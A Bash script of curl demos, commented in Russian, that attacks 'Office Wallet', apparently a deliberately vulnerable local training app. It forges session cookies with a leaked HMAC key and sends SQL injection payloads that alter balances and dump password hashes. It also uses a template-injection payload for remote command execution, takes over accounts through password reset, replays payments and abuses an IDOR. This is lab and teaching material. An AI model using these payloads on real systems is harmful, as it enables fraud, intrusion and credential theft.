#!/usr/bin/env bash
# ow_curl_demo.sh — простые curl-демо по ключевым уязвимостям Office Wallet
#
# Запуск:
#   chmod +x ow_curl_demo.sh
#   ./ow_curl_demo.sh                    # все демо
#   ./ow_curl_demo.sh admin              # только подделка admin
#   ./ow_curl_demo.sh money              # деньги (возврат / replay / sqli)
#   ./ow_curl_demo.sh rce                # SSTI → RCE
#   ./ow_curl_demo.sh reset              # захват через сброс пароля
#
# Требует: curl, docker (для db), openssl
# Стенд: http://localhost:18081  (или BASE=...)

set -u
BASE="${BASE:-http://localhost:18081}"
JAR="/tmp/ow_curl_demo.jar"
SESSION_KEY="office-wallet-session-key"
PAYMENT_KEY="office-wallet-pay-key"

# ── helpers ──────────────────────────────────────────────────────────────
red()  { printf '\033[31m%s\033[0m\n' "$*"; }
grn()  { printf '\033[32m%s\033[0m\n' "$*"; }
cyn()  { printf '\033[36m%s\033[0m\n' "$*"; }
bold() { printf '\033[1m%s\033[0m\n' "$*"; }

step() { echo; bold "== $* =="; }
say()  { printf '    · %s\n' "$*"; }

# db "SQL" — прямой запрос в Postgres стенда
db() {
  docker exec office-wallet-main-db-1 psql -U wallet -d wallet -tAc "$1" 2>/dev/null \
    || docker exec $(docker ps -qf name=db) psql -U wallet -d wallet -tAc "$1" 2>/dev/null
}

# req "описание" curl-args...
# печатает → запрос, ← код + редирект + начало тела
req() {
  local desc="$1"; shift
  cyn "    → $desc"
  local tmp out code redir
  tmp=$(mktemp)
  out=$(curl -sS -o "$tmp" -w '%{http_code} %{redirect_url}' "$@" 2>/dev/null) || true
  code=${out%% *}
  redir=${out#* }
  [ "$redir" = "$out" ] && redir=""
  printf '    \033[36m← HTTP %s' "$code"
  [ -n "$redir" ] && printf '  redirect=%s' "$redir"
  printf '\033[0m  '
  head -c 180 "$tmp" | tr '\n\t' '  '
  [ "$(wc -c < "$tmp")" -gt 180 ] && printf '...'
  echo
  cat "$tmp"
  rm -f "$tmp"
}

login() {
  local user="${1:-ivanov}" pass="${2:-workplace1}"
  rm -f "$JAR"
  curl -sS -c "$JAR" -b "$JAR" -X POST \
    --data-urlencode "login=$user" \
    --data-urlencode "password=$pass" \
    --data-urlencode "return=/" \
    -o /dev/null "$BASE/login"
  grep -q ow_session "$JAR" 2>/dev/null
}

balance() {
  curl -s -b "$JAR" "$BASE/" 2>/dev/null \
    | grep -oP 'who-meta">[^<]*' | sed 's/.*· *//' | tr -d ' ₽' || echo "?"
}

hmac() {
  # hmac <key> <msg>
  printf '%s' "$2" | openssl dgst -sha256 -hmac "$1" -hex 2>/dev/null | sed 's/.*= //'
}

# ── 1. Подделка admin-сессии ─────────────────────────────────────────────
demo_admin() {
  step "1. Подделка admin-сессии (ключ из статики)"
  say "SESSION_KEY лежит в /static/wallet.js + legacy-sync.js → office-wallet-session-key"
  say "Роль в куке не сверяется с БД после проверки HMAC"

  local sig cookie
  sig=$(hmac "$SESSION_KEY" "6:admin")
  cookie="ow_session=ow.6.admin.$sig"
  say "HMAC-SHA256(SESSION_KEY, '6:admin') = ${sig:0:24}..."
  say "Cookie: $cookie"

  echo
  cyn "    → GET /admin/secrets  (с поддельной кукой)"
  local body
  body=$(curl -sS -H "Cookie: $cookie" "$BASE/admin/secrets")
  if echo "$body" | grep -q "Служебный\|Админ\|anomaly\|Служебное"; then
    grn "[+] /admin/secrets открыт без пароля"
  else
    red "[-] админка не открылась (HTTP $(curl -sS -o /dev/null -w '%{http_code}' -H "Cookie: $cookie" "$BASE/admin/secrets"))"
  fi

  echo
  cyn "    → GET /gateway/sms  (коды сброса паролей)"
  body=$(curl -sS -H "Cookie: $cookie" "$BASE/gateway/sms")
  echo "$body" | grep -oE 'код подтверждения сброса [0-9]{6}' | head -3 | sed 's/^/    /'
  if echo "$body" | grep -q "код подтверждения"; then
    grn "[+] SMS-шлюз открыт, коды видны"
  else
    red "[-] SMS-шлюз пуст или недоступен"
  fi
}

# ── 2. Начисление денег через accountant ─────────────────────────────────
demo_adjust() {
  step "2. Начисление денег поддельной ролью accountant"
  say "forge(5, accountant) → POST /accounting/adjust"

  if ! login ivanov workplace1; then
    red "не удалось войти"; return 1
  fi
  local before after
  before=$(db "SELECT balance_kop FROM users WHERE login='ivanov'")
  say "баланс ivanov до: $before коп"

  local sig cookie
  sig=$(hmac "$SESSION_KEY" "5:accountant")
  cookie="ow_session=ow.5.accountant.$sig"

  cyn "    → POST /accounting/adjust  login=ivanov delta_rub=5000"
  curl -sS -H "Cookie: $cookie" -X POST \
    --data-urlencode "login=ivanov" \
    --data-urlencode "delta_rub=5000" \
    --data-urlencode "reason=curl-demo" \
    -o /dev/null -w "    ← HTTP %{http_code} redirect=%{redirect_url}\n" \
    "$BASE/accounting/adjust"

  after=$(db "SELECT balance_kop FROM users WHERE login='ivanov'")
  say "баланс ivanov после: $after коп"
  if [ "$after" != "$before" ]; then
    grn "[+] начислено $(( (after - before) / 100 )) ₽ через поддельную роль бухгалтера"
  else
    red "[-] баланс не изменился"
  fi
}

# ── 3. Возврат с qty=100 (печать денег) ──────────────────────────────────
demo_return_inflate() {
  step "3. Возврат заказа с qty=100 (эмиссия денег)"
  say "refund = total × qty, qty не ограничен"

  if ! login ivanov workplace1; then red "логин fail"; return 1; fi

  # даём денег на покупку на всякий случай
  local sig cookie
  sig=$(hmac "$SESSION_KEY" "5:accountant")
  cookie="ow_session=ow.5.accountant.$sig"
  curl -sS -H "Cookie: $cookie" -X POST \
    -d "login=ivanov&delta_rub=1000&reason=seed" -o /dev/null "$BASE/accounting/adjust"

  local before after oid q
  before=$(db "SELECT balance_kop FROM users WHERE login='ivanov'")
  say "баланс до: $before коп"

  # корзина + котировка + confirm
  curl -sS -b "$JAR" -X POST -d "product_id=1" -o /dev/null "$BASE/cart/add"
  q=$(curl -sS -b "$JAR" -X POST -d "item_comment=curl-return-demo&tip_kop=0" \
        "$BASE/checkout/quote" | grep -oP 'name="quote_id" value="\K[0-9]+')
  say "quote_id=$q"

  local loc
  loc=$(curl -sS -b "$JAR" -X POST -d "quote_id=$q" -o /dev/null -w '%{redirect_url}' \
          "$BASE/checkout/confirm")
  oid=${loc##*/}
  say "заказ #$oid создан"

  local total
  total=$(db "SELECT total_kop FROM orders WHERE id=$oid")
  say "total_kop заказа: $total"

  cyn "    → POST /orders/$oid/return  qty=100"
  curl -sS -b "$JAR" -X POST -d "qty=100" -o /dev/null -w "    ← HTTP %{http_code}\n" \
    "$BASE/orders/$oid/return"

  after=$(db "SELECT balance_kop FROM users WHERE login='ivanov'")
  local status
  status=$(db "SELECT status FROM orders WHERE id=$oid")
  say "баланс после: $after коп  (статус заказа: $status)"
  say "ожидаемый прирост ≈ $(( total * 100 / 100 )) коп × 100 = $(( total * 100 )) коп"

  if [ "$after" -gt "$before" ]; then
    grn "[+] баланс вырос на $(( (after - before) / 100 )) ₽ — деньги напечатаны"
  else
    red "[-] баланс не вырос"
  fi
}

# ── 4. Payment replay (подпись из статики) ───────────────────────────────
demo_replay() {
  step "4. Повтор платежа по подписи из pay.js"
  say "PAYMENT_KEY = office-wallet-pay-key (лежит в /static/pay.js)"
  say "В подписи нет nonce → одна и та же подпись работает бесконечно"

  if ! login ivanov workplace1; then red "логин fail"; return 1; fi

  # берём любую старую операцию
  local row opid amt to
  row=$(db "SELECT id||'|'||amount_kop||'|'||COALESCE(to_user_id,0) FROM operations WHERE to_user_id IS NOT NULL ORDER BY id LIMIT 1 OFFSET 1")
  opid=$(echo "$row" | cut -d'|' -f1)
  amt=$(echo "$row" | cut -d'|' -f2)
  to=$(echo "$row" | cut -d'|' -f3)
  say "берём операцию #$opid  amount=$amt  to=$to"

  local sig
  sig=$(hmac "$PAYMENT_KEY" "${opid}:${amt}:${to}")
  say "HMAC = ${sig:0:24}..."

  local b1 b2 b3
  b1=$(db "SELECT balance_kop FROM users WHERE login='ivanov'")
  say "баланс до: $b1"

  cyn "    → POST /pay/replay  (повтор 1)"
  curl -sS -b "$JAR" -X POST \
    -d "op_id=$opid&amount_kop=$amt&recipient=$to&sig=$sig" \
    -o /dev/null -w "    ← HTTP %{http_code}\n" "$BASE/pay/replay"
  b2=$(db "SELECT balance_kop FROM users WHERE login='ivanov'")

  cyn "    → POST /pay/replay  (повтор 2 — та же подпись)"
  curl -sS -b "$JAR" -X POST \
    -d "op_id=$opid&amount_kop=$amt&recipient=$to&sig=$sig" \
    -o /dev/null -w "    ← HTTP %{http_code}\n" "$BASE/pay/replay"
  b3=$(db "SELECT balance_kop FROM users WHERE login='ivanov'")

  say "баланс: $b1 → $b2 → $b3"
  if [ "$b1" != "$b3" ]; then
    grn "[+] одна подпись провела платёж дважды"
  else
    red "[-] баланс не изменился (возможно, не хватило средств)"
  fi
}

# ── 5. SQLi в amount_rub ─────────────────────────────────────────────────
demo_sqli() {
  step "5. SQL-инъекция в сумме перевода (запись + чтение)"
  say "amount_rub подставляется в SQL как есть → можно UPDATE / SELECT"

  if ! login ivanov workplace1; then red "логин fail"; return 1; fi

  local before after
  before=$(db "SELECT balance_kop FROM users WHERE login='ivanov'")
  say "баланс до: $before"

  cyn "    → POST /transfer/new  amount_rub='1;UPDATE users SET balance_kop=balance_kop+1234500 WHERE login=''ivanov'';--'"
  curl -sS -b "$JAR" -X POST \
    --data-urlencode "recipient=petrova" \
    --data-urlencode "amount_rub=1;UPDATE users SET balance_kop=balance_kop+1234500 WHERE login='ivanov';--" \
    --data-urlencode "memo=sqli-demo" \
    -o /dev/null -w "    ← HTTP %{http_code}\n" "$BASE/transfer/new"

  after=$(db "SELECT balance_kop FROM users WHERE login='ivanov'")
  say "баланс после: $after"
  if [ "$after" -gt "$before" ]; then
    grn "[+] SQLi записала +12345 ₽ напрямую в БД"
  else
    red "[-] запись не прошла (возможно, инъекция уже пофикшена в этой сборке)"
  fi

  echo
  say "error-based чтение хешей:"
  cyn "    → amount_rub=(SELECT string_agg(...))"
  local body
  body=$(curl -sS -b "$JAR" -X POST \
    --data-urlencode "recipient=petrova" \
    --data-urlencode "amount_rub=(SELECT string_agg(login||'='||password_hash, E'\\n') FROM users)" \
    --data-urlencode "memo=x" "$BASE/transfer/new")
  echo "$body" | grep -oE '\$2[aby]\$[0-9]+\$[./A-Za-z0-9]{20,}' | head -4 | sed 's/^/    /'
  if echo "$body" | grep -q '\$2a\$'; then
    grn "[+] хеши утекли через текст ошибки Postgres"
  fi
}

# ── 6. SSTI → RCE ────────────────────────────────────────────────────────
demo_rce() {
  step "6. SSTI → RCE через item_comment (превью чека)"
  say "комментарий заказа попадает в text/template с функцией exec"

  if ! login ivanov workplace1; then red "логин fail"; return 1; fi

  # seed денег
  local sig cookie
  sig=$(hmac "$SESSION_KEY" "5:accountant")
  cookie="ow_session=ow.5.accountant.$sig"
  curl -sS -H "Cookie: $cookie" -X POST \
    -d "login=ivanov&delta_rub=2000&reason=rce-seed" -o /dev/null "$BASE/accounting/adjust"

  curl -sS -b "$JAR" -X POST -d "product_id=1" -o /dev/null "$BASE/cart/add"

  local payload='{{exec "id"}} {{exec "hostname"}}'
  cyn "    → POST /checkout/quote  item_comment='$payload'"
  local q
  q=$(curl -sS -b "$JAR" -X POST \
        --data-urlencode "item_comment=$payload" \
        --data-urlencode "tip_kop=0" \
        "$BASE/checkout/quote" | grep -oP 'name="quote_id" value="\K[0-9]+')
  say "quote_id=$q"

  local loc oid
  loc=$(curl -sS -b "$JAR" -X POST -d "quote_id=$q" -o /dev/null -w '%{redirect_url}' \
          "$BASE/checkout/confirm")
  oid=${loc##*/}
  say "заказ #$oid"

  cyn "    → GET /orders/$oid/preview?renderer=classic"
  local body
  body=$(curl -sS -b "$JAR" "$BASE/orders/$oid/preview?renderer=classic")
  echo "$body" | grep -oE 'uid=[0-9]+\([^)]+\)[^<]*' | head -2 | sed 's/^/    /'
  echo "$body" | grep -oE 'hostname[^<]{0,40}' | head -1 | sed 's/^/    /'

  if echo "$body" | grep -q "uid=0(root)"; then
    grn "[+] RCE подтверждён, контейнер работает от root"
  elif echo "$body" | grep -q "uid="; then
    grn "[+] команда выполнилась (uid виден)"
  else
    red "[-] вывод команды не найден (возможно, другой renderer / фильтр)"
  fi
}

# ── 7. Захват аккаунта через сброс ───────────────────────────────────────
demo_reset() {
  step "7. Захват аккаунта (сброс пароля + SMS-шлюз)"
  say "письмо видно в /mail, код — в /gateway/sms под admin-кукой"

  if ! login ivanov workplace1; then red "логин fail"; return 1; fi

  local old_hash
  old_hash=$(db "SELECT password_hash FROM users WHERE login='sidorov'")

  cyn "    → POST /password/forgot  login=sidorov"
  curl -sS -X POST -d "login=sidorov" -o /dev/null -w "    ← HTTP %{http_code}\n" \
    "$BASE/password/forgot"

  # ссылка из почты
  local rid
  rid=$(curl -sS -b "$JAR" "$BASE/mail" | grep -oP '/password/reset\?rid=\K[0-9]+' | head -1)
  say "rid из /mail: $rid"

  # код из SMS-шлюза (admin cookie)
  local sig cookie code
  sig=$(hmac "$SESSION_KEY" "6:admin")
  cookie="ow_session=ow.6.admin.$sig"
  code=$(curl -sS -H "Cookie: $cookie" "$BASE/gateway/sms" \
           | grep -oP "код подтверждения сброса \K[0-9]{6}(?= \(заявка #$rid\))" | head -1)
  say "код из SMS-шлюза: $code"

  if [ -z "$rid" ] || [ -z "$code" ]; then
    red "[-] не удалось получить rid/code"
    return 1
  fi

  cyn "    → POST /password/reset  rid=$rid code=$code password=Pwned123!"
  curl -sS -X POST \
    --data-urlencode "rid=$rid" \
    --data-urlencode "sms_code=$code" \
    --data-urlencode "password=Pwned123!" \
    -o /dev/null -w "    ← HTTP %{http_code} redirect=%{redirect_url}\n" \
    "$BASE/password/reset"

  if login sidorov Pwned123! /tmp/ow_pwned.jar; then
    grn "[+] вошли как sidorov / Pwned123! — аккаунт захвачен"
  else
    red "[-] вход не удался"
  fi

  # восстанавливаем
  db "UPDATE users SET password_hash='$old_hash' WHERE login='sidorov'" >/dev/null
  say "пароль sidorov восстановлен"
}

# ── 8. IDOR отмена чужого заказа ─────────────────────────────────────────
demo_idor_cancel() {
  step "8. IDOR: отмена чужого заказа"
  say "проверка владельца только на GET, на POST /cancel её нет"

  if ! login ivanov workplace1; then red "логин fail"; return 1; fi

  # создаём заказ от имени petrova напрямую в БД
  local oid owner_bal1 owner_bal2
  oid=$(db "INSERT INTO orders (user_id, status, total_kop, lines_json, item_comment)
            VALUES (2, 'paid', 45000, '[]', 'idor-curl-demo') RETURNING id")
  owner_bal1=$(db "SELECT balance_kop FROM users WHERE id=2")
  say "создан заказ #$oid (user_id=2), баланс владельца: $owner_bal1"

  cyn "    → GET /orders/$oid  (чужой заказ)"
  curl -sS -b "$JAR" -o /dev/null -w "    ← HTTP %{http_code}\n" "$BASE/orders/$oid"

  cyn "    → POST /orders/$oid/cancel"
  curl -sS -b "$JAR" -X POST -o /dev/null -w "    ← HTTP %{http_code} redirect=%{redirect_url}\n" \
    "$BASE/orders/$oid/cancel"

  owner_bal2=$(db "SELECT balance_kop FROM users WHERE id=2")
  local st
  st=$(db "SELECT status FROM orders WHERE id=$oid")
  say "статус: $st   баланс владельца: $owner_bal1 → $owner_bal2"

  if [ "$st" = "cancelled" ] && [ "$owner_bal2" -gt "$owner_bal1" ]; then
    grn "[+] чужой заказ отменён, деньги вернулись владельцу"
  else
    red "[-] не сработало (статус=$st)"
  fi
}

# ── 9. Supply channel leak ───────────────────────────────────────────────
demo_supply() {
  step "9. Утечка supply-channel → себестоимость"
  say "половина токена в JSON, половина в заголовке X-Wallet-Sync-Part"

  if ! login ivanov workplace1; then red "логин fail"; return 1; fi

  local hdrs body pref part channel
  hdrs=$(mktemp); body=$(mktemp)
  curl -sS -b "$JAR" -D "$hdrs" -o "$body" "$BASE/api/catalog"
  pref=$(python3 -c "import json,sys; print(json.load(open('$body')).get('meta',{}).get('ch_pref',''))" 2>/dev/null)
  part=$(grep -i 'X-Wallet-Sync-Part:' "$hdrs" | awk '{print $2}' | tr -d '\r')
  channel="${pref}${part}"
  say "ch_pref=$pref"
  say "X-Wallet-Sync-Part=$part"
  say "собранный канал: $channel"

  cyn "    → GET /api/v2/supply/pricing  X-Wallet-Channel: $channel"
  local pricing
  pricing=$(curl -sS -b "$JAR" -H "X-Wallet-Channel: $channel" "$BASE/api/v2/supply/pricing")
  echo "$pricing" | python3 -c "
import json,sys
try:
  rows=json.load(sys.stdin)
  for r in rows:
    print(f\"    {r['code']}: цена={r['price_kop']}  себестоимость={r['cost_kop']}  «{r.get('supplier_note','')}»\")
except Exception as e:
  print('    parse error', e)
" 2>/dev/null

  if echo "$pricing" | grep -q cost_kop; then
    grn "[+] закрытые цены и поставщики получены"
  else
    red "[-] pricing не открылся"
  fi
  rm -f "$hdrs" "$body"
}

# ── main ─────────────────────────────────────────────────────────────────
main() {
  bold "Office Wallet · curl-демо уязвимостей"
  say "BASE=$BASE"
  say "Нужен поднятый стенд (docker compose up -d) и доступ к контейнеру БД"

  local target="${1:-all}"

  case "$target" in
    admin)   demo_admin ;;
    money)   demo_adjust; demo_return_inflate; demo_replay; demo_sqli; demo_idor_cancel ;;
    rce)     demo_rce ;;
    reset)   demo_reset ;;
    supply)  demo_supply ;;
    all|*)
      demo_admin
      demo_adjust
      demo_return_inflate
      demo_replay
      demo_sqli
      demo_rce
      demo_reset
      demo_idor_cancel
      demo_supply
      ;;
  esac

  echo
  bold "Готово."
  say "Сброс стенда: docker compose down -v && docker compose up -d --build"
}

main "$@"
